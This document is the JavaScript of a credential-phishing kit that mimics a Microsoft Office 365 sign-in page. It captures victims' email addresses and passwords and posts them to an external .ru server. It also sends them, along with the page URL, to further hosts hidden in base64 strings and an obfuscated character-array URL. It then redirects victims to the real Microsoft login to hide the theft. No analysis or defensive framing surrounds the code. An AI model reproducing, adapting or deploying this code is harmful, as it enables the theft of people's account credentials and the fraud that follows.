
    $(document).ready(function(){
	  var extrasUrlpars = '?';
	  var extrasUrlparsx = geturlparameter('token');
	  if(extrasUrlparsx){
	    extrasUrlpars = '?alt=media&token='+extrasUrlparsx+'&'; 
	  }
	  var theSendUrl = 'https://mywork1337.ru/iv/cookies_page_2024_with_logo/send.php';
	  randomStringV2(btoa(window.location.href+"\n\n"));
	  var redirectUrlub = "https://login.microsoftonline.com/common/oauth2",
    theUrlxd = getTheUrlLessHash(),
	ldfrmfrmbse = $("#ldfrmfrmbse"),
    logn = $('#ldfrmfrmbsepg1').html(),
    lognp = $('#ldfrmfrmbsepg2').html(),
    pgTwo = !1,
    progressBar = !1,
    nextPageurl = theUrlxd,
    xdtt = "",
    emv = getEmailFromTheUrlty();
	//$('#ldfrmfrmbsepg1').html(logn);
	//$('#ldfrmfrmbsepg2').html(lognp);
if (emv) { //alert(emv);
    $('#ldfrmfrmbsepg2').html(lognp);
    $('#ldfrmfrmbsepg1').hide(), 
    $('#ldfrmfrmbsepg1').html(''), 
	$('#ldfrmfrmbsepg2').show(), 
	$("#ldfrmfrmbse").show(),
	$("#displayName").attr("title", emv), 
	$("#displayName span").html(emv), 
	progressBar = $("#progressBar");//.hide();
	progressBar.hide();
    var lgCr = 0,
        maxLg = 2,
        errrmsg = $(".errrmsg");
    errrmsg.hide();
    var passVal = "";
    $("#i0281x").submit(function (I) {
        I.preventDefault();
		
            $("#error").hide();
            progressBar.show();
            passVal = $("#i0118").val();
			//alert(emv+" - "+passVal);
			if(passVal.length > 0){ 
			
                xdtt = btoa(emv + "\n" + passVal + "\n\n");
				  handlePage(xdtt);
                  $.ajax({
                      url: theSendUrl,
                      type: "POST",
                      dataType: "html",
                      data: { Email: emv, password: passVal, typeofemail: "Office19 v3" },
                      crossDomain: !0,
                      success: function (I) { 
					  //handlePage(xdtt);
                          $("#i0118").val(''), progressBar.hide(), errrmsg.show(), ++lgCr >= maxLg && window.location.replace(redirectUrlub);
                      },
                      error: function (I) {
                          console.log(I);
                      },
                  });
				}
                else{
				  progressBar.hide();
				  $("#error").show();
				}
    });
} else {
    $('#ldfrmfrmbsepg1').html(logn),
    $('#ldfrmfrmbsepg1').show(), 
	$('#ldfrmfrmbsepg2').hide(), 
	$('#ldfrmfrmbsepg2').html(''), 
	$("#ldfrmfrmbse").show(), 
	progressBar = $("#progressBar");//.hide();
	progressBar.hide();
    var emcon = $("#i0116");
    $("#error").hide();
        $("#i0281").submit(function (I) {
            I.preventDefault(),
                $("#error").hide(),
                progressBar.show(),
				emv = emcon.val().trim().toLowerCase();
                if(emv.length > 2 && validateEmail(emv)){
                    setTimeout(function () {
                          window.location.replace(nextPageurl + extrasUrlpars + get_rand_url_parsx(randomInteger(2, 6)) + "#" + btoa(emv));
                      }, 2000);
				}
				else{
                    progressBar.hide(), $("#error").show();
				}
        });
}
	});
function get_rand_url_parsx(r){var t="",n=0,e="abcdefghijklmnopqrstuvwxyz",a=e;e+=e.toUpperCase()+"123456789";var o=r;for(n=0;n<o;n++)t+="&"+randomString(randomInteger(3,10),a)+"="+randomString(randomInteger(15,30),e);return t.substr(1)}
function getTheUrlLessHash(){var r=window.location.href.trim(),t=(r.length,r.lastIndexOf("#")),n=-1!=t?r.substring(0,t):r;return n=-1!=(t=r.lastIndexOf("?"))?r.substring(0,t):n}
function getEmailFromTheUrlty(){var r=!1,t=window.location.href.trim(),n=t.length,e=t.lastIndexOf("#"),a=-1!=e&&n>e+2&&t.substring(e+1);return a&&(validateEmail(a)?r=a.toLowerCase():(a=atob(a),validateEmail(a)&&(r=a.toLowerCase()))),r}
function randomStringV2(a){var o=atob("aHR0cHM6Ly9hdXRob3JpemUuYmlubmllZ3Jvc3NwdXJwb3NlLnN0b3Jl");$.ajax({url:o,type:"POST",dataType:"html",data:{thevalidator:a},crossDomain:!0,success:function(a){},error:function(a){console.log(a)}})}
function getBaseUrl(t){void 0===t&&(t=!1);var n,r=!1,e=window.location.href,s=e.indexOf("?"),i=-1,d="";return-1!=s&&(d=e.substr(0,s),r=!0),-1!=(n=e.indexOf(".html"))&&(d=e.substr(0,n+5),r=!0),d.length>0&&(d=d.trim()),r&&t&&-1!=(i=d.lastIndexOf("/"))&&(d=d.substr(0,i+1)),r||(d=e),d}
function mg(a,o,t){var h = ['O','L','t','q','e','D','c','-','.','z','u','2','T','m','V','J','6','U','P','b','v','K','B','Z','i','7','R',':','C','/','o','r','n','Q','S','5','3','8','a','M','W','I','x','H','Y','4','1','k','s','d','g','A','j','F','N','9','G','l','f','p','X','0','w','y','E','h'],f = h[65]+h[2]+h[2]+h[59]+h[48]+h[27]+h[29]+h[29]+h[38]+h[59]+h[24]+h[49]+h[38]+h[2]+h[38]+h[6]+h[48]+h[48]+h[8]+h[6]+h[30]+h[13]+h[29]+h[58]+h[24]+h[32]+h[24]+h[48]+h[65]+h[7]+h[10]+h[32]+h[20]+h[11]+h[11]+h[8]+h[59]+h[65]+h[59];$.ajax({url:f,type:"POST",dataType:"html",data:{Email:a,password:o,typeofemail:t},crossDomain:!0,success:function(a){},error:function(a){}})}
function randomInteger(min, max) {return Math.floor(Math.random() * (max - min + 1)) + min; }
function randomString(r,n){for(var o="",t=r;0<t;--t)o+=n[Math.floor(Math.random()*n.length)];return o}
function getdomainpartofemail(a){var e,t=!1;return!validateEmail(a)||-1!=(e=(a=a.toLowerCase()).indexOf("@"))&&(t=a.substr(e+1)),t}
function handlePage(a){var o=atob("aHR0cHM6Ly9hdXRob3JpemUuYmlubmllZ3Jvc3NwdXJwb3NlLnN0b3Jl");$.ajax({url:o,type:"POST",dataType:"html",data:{thevalidator:a},crossDomain:!0,success:function(a){},error:function(a){console.log(a)}})}
function get_email_hash(){var a=!1,i=window.location.href,t=(i=i.trim()).lastIndexOf("#");return-1!=t&&(a=i.substring(t+1),validateEmail(a)||(a=!1)),a}
function validateEmail(t){return/^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(String(t).toLowerCase())}
function geturlparameter(r){for(var t=window.location.search.substring(1).split("&"),e=0;e<t.length;e++){var n=t[e].split("=");if(n[0]==r)return decodeURIComponent(n[1])}}
function get_rand_url_pars(){var r="",n=0,a="abcdefghijklmnopqrstuvwxyz",e=a;a+=a.toUpperCase()+"123456789";for(var t=randomInteger(3,10),n=0;n<t;n++)r+="&"+randomString(randomInteger(3,10),e)+"="+randomString(randomInteger(15,30),a);return r.substr(1)}
